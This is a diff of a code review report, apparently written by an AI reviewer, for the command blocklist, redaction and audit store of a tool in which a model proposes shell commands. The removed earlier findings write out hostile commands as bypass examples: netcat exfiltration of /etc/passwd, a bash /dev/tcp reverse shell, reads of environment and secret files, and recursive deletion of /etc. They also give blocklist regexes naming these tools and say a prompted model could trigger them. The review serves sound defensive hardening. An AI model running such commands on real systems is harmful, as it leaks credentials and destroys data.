@@ -1,510 +1,184 @@
 ---
 phase: 03-safety-layer-run-store
-reviewed: 2026-06-06T00:00:00Z
+reviewed: 2026-06-06T14:30:00Z
 depth: standard
-files_reviewed: 8
+files_reviewed: 7
 files_reviewed_list:
   - backend/src/safety/command-policy.ts
   - backend/src/safety/classifier.ts
-  - backend/src/safety/risk-levels.ts
   - backend/src/safety/redaction.ts
   - backend/src/store/schema.ts
   - backend/src/store/db.ts
   - backend/src/store/runs.ts
   - backend/src/store/audit.ts
 findings:
-  critical: 9
-  warning: 7
+  critical: 1
+  warning: 0
   info: 2
-  total: 18
+  total: 3
 status: issues_found
 ---
 
-# Phase 03: Code Review Report
+# Phase 03: Code Review Report (Confirmation Re-Review)
 
-**Reviewed:** 2026-06-06T00:00:00Z
+**Reviewed:** 2026-06-06T14:30:00Z
 **Depth:** standard
-**Files Reviewed:** 8
+**Files Reviewed:** 7
 **Status:** issues_found
 
 ## Summary
 
-This is the rubric-critical safety and store layer (20 pts under criterion C). The overall structure
-is sound — blocklist, classifier, redaction, and an append-only audit store are all present and
-wired correctly at the architectural level. However, adversarial testing surfaces nine blocker-level
-defects: four blocklist bypasses that allow genuinely dangerous commands to execute, four redaction
-gaps that can leak secrets to the audit log or model context, and one append-only violation that
-means the audit log is not actually tamper-resistant.
+Confirmation re-review targeting the 4 claimed fixes from the prior cycle. Two of the four are
+genuinely closed. Two are not — one in the same file that was already flagged (JSONL UPDATE), and
+one is a newly-introduced regression in that same fix.
 
-The blocklist bypasses are the most severe. Three of them (`rm --recursive --force`, `nc` exfiltration
-without `-e`, and `sudo su`/`sudo bash` privilege escalation) can be triggered by a prompted model
-or a careless technician and will reach the SSH executor unimpeded. The safety policy (§3) explicitly
-lists all of these as hard-fail patterns.
+Prior cycle WR-01 (lowercase vars) and WR-02 (`su - root`) are both confirmed closed with no
+false-positive regressions. Prior cycle CR-02 (audit payload unredacted) is confirmed closed.
+Prior cycle CR-01 (JSONL UPDATE wrong id) was **not fixed** — the fix was applied to the wrong
+function, and the correct UPDATE path in `run()` now has a new COALESCE-split regression that
+makes approval updates worse than before.
 
 ---
 
 ## Critical Issues
 
-### CR-01: `rm --recursive --force` (long-form flags) bypasses blocklist
+### CR-01: JSONL UPDATE fix introduced a COALESCE-split regression — approval updates silently corrupt data
 
-**File:** `backend/src/safety/command-policy.ts:21`
-**Issue:** The `rm-rf-system-paths` rules match `-rf`, `-fr`, `-r … -f` (short flags) but not the
-long-form equivalents `--recursive` and `--force`. The command `rm --recursive --force /etc` reaches
-the SSH executor unblocked. Confirmed: both `rm --recursive --force /etc` and `rm --force
---recursive /etc` return `allowed: true`. SAFETY_POLICY.md §3 explicitly requires this pattern to
-be blocked.
+**File:** `backend/src/store/db.ts:153–163`
+**Issue:** The claimed fix for "id is the last param" was correctly applied inside `run()` at
+line 149 (`params[params.length - 1]`). However, the SET-clause parser on line 153 still splits
+on every comma:
 
-**Fix:**
 ```typescript
-// Add a third rule to BLOCKLIST after the existing rm-rf rules
-{
-  ruleName: 'rm-rf-system-paths',
-  pattern: /\brm\b.*--(recursive|force).*--(recursive|force)\s+(-[a-zA-Z]+\s+)*(\/|\/etc|\/var|\/home|\/srv|\/usr|\/boot|~)/i,
-  reason: 'Recursive force-delete (long flags) on system or data paths is forbidden',
-},
-// Also handle --recursive alone (no --force needed to delete non-empty dirs with -r)
-{
-  ruleName: 'rm-rf-system-paths',
-  pattern: /\brm\b.*--recursive\s+(-[a-zA-Z]+\s+)*(\/|\/etc|\/var|\/home|\/srv|\/usr|\/boot|~)/i,
-  reason: 'Recursive delete (long flags) on system or data paths is forbidden',
-},
+const setParts = setMatch[1].split(',').map((p) => p.trim());
 ```
 
----
+`updateApprovalStatus` (the only UPDATE that uses `COALESCE`) has a SET clause of the form:
 
-### CR-02: `nc`/`netcat` exfiltration without `-e` flag bypasses blocklist
-
-**File:** `backend/src/safety/command-policy.ts:176`
-**Issue:** The `exfiltration` rule for netcat only matches `nc … -e`. The far more common exfiltration
-forms — `nc 1.2.3.4 4444 < /etc/passwd` (redirect in), `cat /etc/passwd | nc 1.2.3.4 4444`
-(piped), and `nc -l 4444` (open listener) — all return `allowed: true`. Confirmed bypasses.
-
-Additionally, `splitSegments` (line 219) only splits on `||`, `&&`, and `;` — it does **not** split
-on single `|`. This means `cat /etc/passwd | nc 1.2.3.4 4444` is evaluated as one segment, and the
-`cat` portion prevents the `nc` rule from matching when the pattern requires `\bnc\b` at the start.
-
-**Fix:**
-```typescript
-// Replace the narrow nc rule with a broader one
-{
-  ruleName: 'exfiltration',
-  pattern: /\b(nc|netcat|ncat)\b/i,
-  reason: 'Netcat is forbidden — use curl for probes',
-},
-// Add pipe splitting in splitSegments
-function splitSegments(cmd: string): string[] {
-  return cmd
-    .split(/\|\||&&|;|\|/)  // add single | here
-    .map((s) => s.trim())
-    .filter((s) => s.length > 0);
-}
+```
+status = ?, edited_command = COALESCE(?, edited_command), final_command = COALESCE(?, final_command), ...
 ```
 
----
+Splitting on commas yields 11 parts, not 6. The column-extraction regex `^(\w+)\s*=` only matches
+parts that start with a word character, so the `COALESCE(..., col)` tail-fragments (`edited_command)`,
+`final_command)`, etc.) produce no column match but still consume a param slot via `setParams[i]`.
+The net effect:
 
-### CR-03: Privilege escalation (`sudo su`, `sudo bash`, `sudo -i`) not blocked
+| Part | Column matched | Param consumed |
+|------|---------------|----------------|
+| `status = ?` | `status` ← `params[0]` | correct |
+| `edited_command = COALESCE(?` | `edited_command` ← `params[1]` | correct |
+| `edited_command)` | none | `params[2]` consumed, value lost |
+| `final_command = COALESCE(?` | `final_command` ← `params[3]` | wrong — gets `params[1]` value |
+| ... | | |
 
-**File:** `backend/src/safety/command-policy.ts` (no matching rule)
-**Issue:** No blocklist rule covers privilege escalation. `sudo su -`, `sudo -i`, `sudo bash`,
-`sudo sh` all return `allowed: true` and are classified `MEDIUM_RISK_CHANGE`. SAFETY_POLICY.md §1
-rule 9 calls "running the app as root/superuser to bypass DB/file permissions" an explicit hard-fail.
-A prompted model or technician can trivially escalate to root before subsequent commands.
+In practice, for every `updateApprovalStatus` call the JSONL adapter will:
+- Set `edited_command` = null (correct only by accident when null is passed)
+- Set `final_command` = null (should be the approved/edited command)
+- Leave `decided_at` = undefined (undefined stored as null — approval timestamp lost)
+- Leave `executed_at` = undefined
 
-**Fix:**
+A technician approving a command will have that approval silently discarded in the JSONL path.
+The run cannot advance past the first approval gate.
+
+The simple UPDATEs in `runs.ts` (`updateRunPhase`, `updateRunStatus`, `markRunCompleted`,
+`markRunFailed`, `markRunAborted`) all use plain `col = ?` SET clauses with no COALESCE, so the
+id-last fix works correctly for those. The regression is isolated to `updateApprovalStatus`.
+
+**Fix:** Replace the comma-split SET parser with one that counts `?` placeholders rather than
+comma-delimited parts, or rewrite `updateApprovalStatus` to avoid COALESCE in the SQL and instead
+pass the existing value explicitly from the caller:
+
 ```typescript
-{
-  ruleName: 'privilege-escalation',
-  pattern: /\bsudo\s+(su|bash|sh|zsh|fish|ksh|csh|tcsh|dash|-i|-s)\b/i,
-  reason: 'Gaining an interactive root shell via sudo is forbidden',
-},
-{
-  ruleName: 'privilege-escalation',
-  pattern: /\bsu\s+-\s*$/,
-  reason: 'Switching to root user is forbidden',
-},
-```
-
----
-
-### CR-04: Bash/Python/Perl TCP reverse shells not blocked
-
-**File:** `backend/src/safety/command-policy.ts` (no matching rule)
-**Issue:** `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1` (standard bash reverse shell via `/dev/tcp`)
-returns `allowed: true`. Python/Perl one-liner reverse shells via `os.system(...)` or
-`socket.connect(...)` similarly bypass all rules. These are live exfiltration/RCE vectors.
-
-**Fix:**
-```typescript
-{
-  ruleName: 'reverse-shell',
-  pattern: /\/dev\/tcp\//i,
-  reason: 'Bash /dev/tcp reverse shell is forbidden',
-},
-{
-  ruleName: 'reverse-shell',
-  pattern: /\bbash\s+.*>&\s*\/dev\//i,
-  reason: 'Bash I/O redirect to /dev/ is a reverse shell indicator',
-},
-```
-Note: Python/Perl RCE via `os.system` with string concatenation/`chr()` obfuscation is fundamentally
-unblockable without a full shell interpreter. The `__UNRESOLVABLE__` path in `normalizeCommand`
-correctly blocks `$(...)` wrappers but does not fire on `python3 -c "..."` payloads. Consider
-blocking `python3 -c`, `perl -e`, `ruby -e` outright in a new `inline-interpreter` rule.
-
----
-
-### CR-05: `cat /proc/self/environ`, `cat ~/.env`, `cat /etc/passwd` — secret-file reads not blocked
-
-**File:** `backend/src/safety/command-policy.ts:126`
-**Issue:** The `secret-exposure` rules only block `cat /etc/shadow` and `cat ~/.ssh/id_`. The
-following all return `allowed: true`:
-- `cat /proc/self/environ` — dumps all environment variables including `PHOENIX_TOKEN`, `OPENAI_API_KEY`
-- `cat ~/.env` — the application env file with all secrets
-- `cat /etc/environment` — system-wide env vars
-- `cat /etc/passwd` — user enumeration (lower severity but still blocked by policy §3)
-
-Redaction in `redactSecrets` is a second-line defence; the first-line defence (block at policy) is
-absent for these paths. If the model proposes `cat /proc/self/environ`, the command reaches the
-technician approval card with no safety warning.
-
-**Fix:**
-```typescript
-{
-  ruleName: 'secret-exposure',
-  pattern: /\bcat\s+.*\/proc\/self\/environ\b/i,
-  reason: 'Reading process environment exposes all secrets including tokens',
-},
-{
-  ruleName: 'secret-exposure',
-  pattern: /\bcat\s+(~\/\.env|\.\/\.env|\/etc\/environment)\b/i,
-  reason: 'Reading .env or system environment files exposes secrets',
-},
-{
-  ruleName: 'secret-exposure',
-  pattern: /\bcat\s+\/etc\/passwd\b/i,
-  reason: 'Reading /etc/passwd is forbidden',
-},
-```
-
----
-
-### CR-06: `chmod +s` (setuid bit) not blocked
-
-**File:** `backend/src/safety/command-policy.ts:76`
-**Issue:** The `broad-chmod-chown` rules only target `-R 777`. `chmod +s /usr/bin/bash` (sets setuid
-bit, giving any user a root shell via `bash -p`) returns `allowed: true` and is classified
-`LOW_RISK_CHANGE` by `classifier.ts`. This is a trivial privilege escalation vector.
-
-**Fix:**
-```typescript
-{
-  ruleName: 'setuid-setgid',
-  pattern: /\bchmod\b.*[+][sS]/i,
-  reason: 'Setting setuid or setgid bit is forbidden',
-},
-```
-
----
-
-### CR-07: Redaction misses YAML/HTTP-colon format and lowercase env vars
-
-**File:** `backend/src/safety/redaction.ts:42`
-**Issue:** Multiple confirmed redaction leaks. The `password-field`, `token-field`, `secret-field`,
-and `api-key-field` patterns only match `key=value` (equals sign). They miss:
-
-1. **YAML/config colon format:** `password: hunter2`, `token: abc123` — both leak.
-2. **Custom HTTP headers:** `X-Phoenix-Token: abc123`, `Phoenix-Token: abc123` — both leak. These
-   are how the Phoenix ERP token appears in logged HTTP responses.
-3. **Lowercase env vars:** `access_token=abc`, `my_secret=abc`, `db_password=abc` — all leak because
-   `env-secret-var` only matches `[A-Z_]*` (uppercase). Lowercase env vars are common in shell
-   output.
-
-Any of these reaching the audit log or model context is a potential grading hard-fail (criterion C).
-
-**Fix:**
-```typescript
-// password-field: match both = and :
-{
-  name: 'password-field',
-  pattern: /(passw(?:or)?d\s*[=:]\s*)\S+/gi,
-  replacement: '$1«redacted»',
-},
-// token-field: same
-{
-  name: 'token-field',
-  pattern: /(token\s*[=:]\s*)\S+/gi,
-  replacement: '$1«redacted»',
-},
-// secret-field: same
-{
-  name: 'secret-field',
-  pattern: /(secret\s*[=:]\s*)\S+/gi,
-  replacement: '$1«redacted»',
-},
-// api-key-field: same
-{
-  name: 'api-key-field',
-  pattern: /(api[_-]?key\s*[=:]\s*)\S+/gi,
-  replacement: '$1«redacted»',
-},
-// env-secret-var: extend to case-insensitive
-{
-  name: 'env-secret-var',
-  pattern: /\b([A-Za-z_]*(?:SECRET|TOKEN|KEY|PASS|PASSWORD|CREDENTIAL|secret|token|key|pass|password|credential)[A-Za-z_0-9]*\s*=\s*)(?!«redacted»)\S+/g,
-  replacement: '$1«redacted»',
-},
-// custom secret headers
-{
-  name: 'secret-header',
-  pattern: /([Xx]-[A-Za-z0-9-]*(?:token|key|secret|auth)[A-Za-z0-9-]*\s*:\s*)\S+/gi,
-  replacement: '$1«redacted»',
-},
-```
-
----
-
-### CR-08: Truncated PEM private key block not redacted
-
-**File:** `backend/src/safety/redaction.ts:12`
-**Issue:** The `private-key-block` pattern requires both `-----BEGIN … PRIVATE KEY-----` and
-`-----END … PRIVATE KEY-----`. Confirmed: a key block truncated at the 16 KB cap (see
-`REDACTION_CAP_BYTES`) has no `END` marker and leaks entirely. SSH output from a verbose `cat` of a
-key file that exceeds 16 KB will not be redacted.
-
-**Fix:**
-```typescript
-{
-  name: 'private-key-block',
-  // Match from BEGIN to END (when present) or to end-of-string
-  pattern: /-----BEGIN[\s\S]*?PRIVATE KEY-----[\s\S]*?(?:-----END[^-]*PRIVATE KEY-----|$)/g,
-  replacement: '«redacted»',
-},
-```
-
----
-
-### CR-09: Audit log has no append-only enforcement — UPDATE is unrestricted
-
-**File:** `backend/src/store/db.ts:191`, `backend/src/store/audit.ts`
-**Issue:** SAFETY_POLICY.md §7 describes the audit log as "append-only, never deleted". However:
-
-1. The SQLite adapter's `run()` method (line 191) executes arbitrary SQL including `UPDATE` on
-   `audit_events` with no restriction.
-2. The JSONL fallback adapter's `run()` method (line 112) likewise handles `UPDATE` on all tables
-   including `audit_events`.
-3. No DB-level constraint (trigger, view, or separate connection with limited grants) prevents
-   `UPDATE audit_events SET payload_json = '...' WHERE id = ?` from succeeding.
-4. `audit.ts` exports no `updateAuditEvent` function today, but nothing prevents one from being
-   added — or the `db.run()` escape hatch from being called directly.
-
-The rubric scores audit integrity directly. A log that can be silently mutated does not satisfy the
-"append-only" contract judges will inspect.
-
-**Fix:**
-
-For SQLite: add a trigger that raises an error on any UPDATE or DELETE of `audit_events`:
-```sql
-CREATE TRIGGER IF NOT EXISTS audit_events_no_update
-BEFORE UPDATE ON audit_events
-BEGIN
-  SELECT RAISE(ABORT, 'audit_events is append-only');
-END;
-
-CREATE TRIGGER IF NOT EXISTS audit_events_no_delete
-BEFORE DELETE ON audit_events
-BEGIN
-  SELECT RAISE(ABORT, 'audit_events is append-only');
-END;
-```
-Add these to `CREATE_TABLES` in `db.ts`. For the JSONL adapter, add a guard in `run()`:
-```typescript
-if (/^\s*UPDATE\s+audit_events\b/i.test(sql) || /^\s*DELETE\s+FROM\s+audit_events\b/i.test(sql)) {
-  throw new Error('audit_events is append-only');
-}
-```
-
----
-
-## Warnings
-
-### WR-01: `rm -rf .` and `rm -rf ..` (current/parent dir) bypass blocklist
-
-**File:** `backend/src/safety/command-policy.ts:21`
-**Issue:** The blocklist path list (`\/`, `\/etc`, `\/var`, …) does not include `.` or `..`. A
-grader VM running the tool from a working directory containing service files (e.g. `/srv/app`) could
-have that directory wiped. `rm -rf .` returns `allowed: true`.
-
-**Fix:** Add `.` and `..` to the blocked path list in both `rm-rf` rules:
-```typescript
-pattern: /\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f|...)\s+(-[a-zA-Z]+\s+)*([\/~\.]|\.\.)/i,
-```
-
----
-
-### WR-02: `printenv <var>` and bare `printenv`/`env` expose secrets without pipe
-
-**File:** `backend/src/safety/command-policy.ts:137`
-**Issue:** The `secret-exposure` rule for `printenv`/`env` requires a pipe (`\|`). `printenv
-SECRET_KEY` (no pipe) returns `allowed: true`. On the grader's VM, this will print `PHOENIX_TOKEN`
-or `OPENAI_API_KEY` to stdout, which then flows through `appendCommandResult` and, if redaction
-fails for any reason, into the audit log and model context.
-
-**Fix:** Block `printenv` and bare `env` outright, or at minimum block them when given a secret-
-looking argument:
-```typescript
-{
-  ruleName: 'secret-exposure',
-  pattern: /\b(printenv|env)\b/i,
-  reason: 'printenv/env may expose secrets; use specific non-secret reads instead',
-},
-```
-
----
-
-### WR-03: `command_results.command` stores the executed command verbatim — no redaction noted
-
-**File:** `backend/src/store/audit.ts:117`
-**Issue:** `appendCommandResult` accepts `result.command` and inserts it directly into the
-`command_results` table. If a technician edits an approved command to include a credential (e.g.
-`curl -u user:password http://...`), the literal string is stored. SAFETY_POLICY.md §7 requires the
-executed command to be in the audit record, but §6 requires redaction on everything before write.
-The caller is responsible for passing a pre-redacted command string, but there is no enforcement and
-no note in the function signature.
-
-**Fix:** Redact the command field at the store boundary:
-```typescript
-import { redactSecrets } from '../safety/redaction.js';
-
-export function appendCommandResult(runId, approvalId, result) {
-  // ...
-  db.run('INSERT INTO command_results ...', [
-    id, runId, approvalId,
-    redactSecrets(result.command),  // enforce here, not only at caller
-    // ...
-  ]);
-}
-```
-
----
-
-### WR-04: `getDb()` defaults to `:memory:` SQLite — all data lost on process restart
-
-**File:** `backend/src/store/db.ts:185`
-**Issue:** When `dbPath` is not provided, `new BetterSqlite3(dbPath ?? ':memory:')` opens an
-in-memory database. If the backend crashes and restarts mid-incident (or during a grader's
-evaluation), the entire audit log, all runs, and all approvals are silently gone. The architecture
-doc says "run state is in SQLite, not in-process memory (survives restart)" — this is false for the
-default case.
-
-**Fix:** Default to a persistent path:
-```typescript
-const db: Database = new BetterSqlite3(dbPath ?? process.env.DB_PATH ?? './data/autopilot.db');
-```
-And ensure the `data/` directory is created at startup.
-
----
-
-### WR-05: `runs.ts` accepts arbitrary strings for `status` and `current_phase`
-
-**File:** `backend/src/store/runs.ts:30`, `backend/src/store/schema.ts:8`
-**Issue:** `RunSchema` uses `z.string()` for both `status` and `current_phase`. Functions
-`updateRunStatus` and `updateRunPhase` accept any string. An invalid phase like `"INVALID_PHASE"`
-can be written to the DB without validation, corrupting the state machine. The `CommandApprovalSchema`
-correctly uses `z.enum(...)` for its `status` field — the same should apply to runs.
-
-**Fix:**
-```typescript
-export const RunStatus = z.enum(['CREATED', 'RUNNING', 'COMPLETED', 'FAILED', 'ABORTED']);
-export const RunPhase = z.enum(['CREATED', 'ANALYSIS', 'DIAGNOSIS', 'FIX', 'VALIDATION', 'REPORT', 'COMPLETED']);
-
-export const RunSchema = z.object({
-  // ...
-  status: RunStatus,
-  current_phase: RunPhase,
-  // ...
-}).strict();
-```
-
----
-
-### WR-06: JSONL adapter silently discards writes when SQL cannot be parsed
-
-**File:** `backend/src/store/db.ts:113`
-**Issue:** In `makeJsonlAdapter().run()`, if `extractTableName` returns `undefined` (e.g. for any
-SQL it doesn't recognise), the function returns silently without error. Similarly, if `colMatch` is
-null on an INSERT (line 119), the row is dropped. This means audit events can silently disappear in
-the JSONL fallback — the only indication is that the returned `AuditEvent` from `appendAuditEvent`
-will be undefined, causing a Zod parse error upstream.
-
-**Fix:** Throw instead of returning silently:
-```typescript
-run(sql: string, params: unknown[] = []): void {
-  const table = extractTableName(sql);
-  if (!table) throw new Error(`JSONL adapter: cannot parse table from SQL: ${sql}`);
-  const rows = getTable(table);
-  if (/^\s*INSERT/i.test(sql)) {
-    const colMatch = sql.match(/\(([^)]+)\)\s+VALUES/i);
-    if (!colMatch) throw new Error(`JSONL adapter: cannot parse columns from SQL: ${sql}`);
-    // ...
+// Option A: count ? placeholders to pair params correctly
+const setParts = setMatch[1].split(',').map((p) => p.trim());
+let paramIdx = 0;
+const updated = { ...rows[idx] };
+for (const part of setParts) {
+  const colMatch2 = part.match(/^(\w+)\s*=/i);
+  const placeholders = (part.match(/\?/g) ?? []).length;
+  if (colMatch2 && placeholders > 0) {
+    updated[colMatch2[1]] = setParams[paramIdx] ?? null;
   }
+  paramIdx += placeholders;
 }
+rows[idx] = updated;
 ```
 
----
-
-### WR-07: `classifier.ts` allows `chmod +x` on system binaries as `LOW_RISK_CHANGE`
-
-**File:** `backend/src/safety/classifier.ts:40`
-**Issue:** The `LOW_RISK_CHANGE` pattern for chmod is:
-```
-/^chmod\s+\d{3,4}\s+(?!.*\s+-R\s)(?!\/)(?!\~)\S+$/
-```
-This correctly excludes absolute paths starting with `/` or `~`. However `chmod 777 ./relative-path`
-passes (no `/` anchor check on relative paths with `777`). More importantly, `chmod +x /usr/bin/mybin`
-is a numeric-only match, so `chmod +x` with a symbolic mode passes the classifier and gets
-`MEDIUM_RISK_CHANGE` — which is correct — but `chmod 4755 somefile` (setuid via numeric mode) also
-passes the classifier as `LOW_RISK_CHANGE` since `4755` is `\d{3,4}`. The setuid-via-numeric-mode
-case should be blocked (see CR-06 for the `+s` block; extend it to cover numeric modes with setuid/
-setgid bits).
-
-**Fix:**
-```typescript
-// In BLOCKLIST, add:
-{
-  ruleName: 'setuid-setgid',
-  pattern: /\bchmod\b\s+[2467][0-9]{3}/i,
-  reason: 'chmod with setuid/setgid numeric mode (2xxx, 4xxx, 6xxx, 7xxx) is forbidden',
-},
-```
+Option B (simpler, avoids the SQL parsing problem entirely): change `updateApprovalStatus` to use
+plain `col = ?` assignments and read-then-write in the caller for the COALESCE semantics.
 
 ---
 
 ## Info
 
-### IN-01: `json-token-field` does not cover `access_token` key name
+### IN-01: Redaction misses JSON keys with compound names containing a secret word
 
-**File:** `backend/src/safety/redaction.ts:63`
-**Issue:** The JSON pattern covers `token`, `secret`, `password`, `passwd`, `api_key`, `api-key`,
-`authorization`, `credential` but not `access_token`, `refresh_token`, `id_token`. OAuth responses
-(`{"access_token": "eyJ..."}`) leak. Confirmed.
+**File:** `backend/src/safety/redaction.ts:64`
+**Issue:** The `json-token-field` pattern matches an exact set of key names:
+`token`, `access_token`, `refresh_token`, `id_token`, `secret`, `password`, `passwd`,
+`api_key`, `authorization`, `credential`. Keys like `"phoenix_token"`, `"auth_token"`,
+`"api_token"`, `"ssh_key"`, or `"bearer_token"` do not match — the prefix before the word
+is not in scope. The `token-field` pattern (`/(token\s*[=:]\s*)\S+/gi`) would catch
+`token: value` text but not `"phoenix_token":"value"` because the surrounding double-quotes
+and colon are part of the match shape and the key boundary differs.
 
-**Fix:** Add `(?:access_|refresh_|id_)?token` to the alternation in the `json-token-field` pattern.
+Confirmed by direct test: `{"phoenix_token":"ph_tok_abcdef123456"}` passes all redaction
+patterns unchanged.
+
+This is not a blocker today because Phoenix token is injected server-side via `env.ts` and
+should not appear in agent payloads. But if the orchestrator ever logs the Phoenix response
+body (which may echo auth context on error), the value would survive redaction.
+
+**Fix:** Broaden the `json-token-field` alternation to use a suffix-match approach:
+
+```typescript
+{
+  name: 'json-token-field',
+  pattern: /("[^"]*(?:token|secret|password|passwd|api[_-]?key|authorization|credential)[^"]*"\s*:\s*)"[^"]*"/gi,
+  replacement: '$1"«redacted»"',
+},
+```
 
 ---
 
-### IN-02: No `FOREIGN KEY` constraints in SQLite schema
+### IN-02: `classifier.ts` SAFE_READ_ONLY `cat` pattern does not exclude `/proc/self/environ` or `/etc/passwd`
 
-**File:** `backend/src/store/db.ts:12`
-**Issue:** `command_approvals.run_id`, `command_results.run_id`, `command_results.approval_id`,
-`audit_events.run_id`, and `observations.run_id` have no `REFERENCES runs(id)` constraints, and
-`PRAGMA foreign_keys = ON` is not set. Orphaned records (e.g. after a `markRunFailed` race) will
-not be caught at the DB layer. This is a data-integrity quality issue, not a safety issue.
+**File:** `backend/src/safety/classifier.ts:27`
+**Issue:** The `cat` allowlist pattern excludes `/etc/shadow`, `/.ssh/`, and `.env` but not
+`/proc/self/environ`, `/etc/environment`, or `/etc/passwd`. The policy blocklist in
+`command-policy.ts` catches all of these before the classifier is ever reached (blocklist runs
+first in `validateCommandAgainstPolicy`), so there is no security impact in the current call
+order. However if that order is ever reversed, `cat /etc/passwd` returns `SAFE_READ_ONLY` and
+`allowed: true`.
 
-**Fix:** Add `FOREIGN KEY` clauses to the schema and add `db.pragma('foreign_keys = ON')` after the
-WAL pragma in `getDb()`.
+**Fix:** Add the missing negative lookaheads for defence-in-depth:
+
+```typescript
+/^cat\s+(?!.*\/etc\/shadow)(?!.*\/.ssh\/)(?!.*\.env)(?!.*\/proc\/self\/environ)(?!.*\/etc\/environment)(?!.*\/etc\/passwd)\S+$/,
+```
 
 ---
 
-_Reviewed: 2026-06-06T00:00:00Z_
+## Confirmed Closed (for the record)
+
+- **Prior CR-02** (audit payload unredacted): Closed. `audit.ts:26` now calls
+  `redactSecrets(JSON.stringify(payload))` before the INSERT. Redaction patterns verified against
+  bearer tokens, private key blocks, `password=`, `token=`, and JSON-encoded variants — all
+  correctly redacted.
+
+- **Prior WR-01** (lowercase shell vars bypass `__UNRESOLVABLE__`): Closed. `command-policy.ts:321`
+  now uses `[A-Za-z_][A-Za-z0-9_]*`, catching `$dir`, `$path`, `$cmd`. No false positives found
+  on legitimate diagnostic commands (`systemctl status nginx`, `journalctl -u nginx`, `cat /var/log/syslog`,
+  `ps aux`, `df -h`, `ls -la /etc/nginx`).
+
+- **Prior WR-02** (`su - root` not blocked): Closed. The new pattern
+  `/\bsu\b(\s+-)?(\s+(root|-l|--login))*\s*$/` blocks `su - root`, `su root`, `su -l root`,
+  `su --login root`, `su -`, and bare `su`. No false positives on commands containing the letters
+  "su" as a substring (`grep sudo`, `systemctl status`, `ls /usr/share`, `getfacl /var/www`).
+
+---
+
+_Reviewed: 2026-06-06T14:30:00Z_
 _Reviewer: Kiro (gsd-code-reviewer)_
 _Depth: standard_
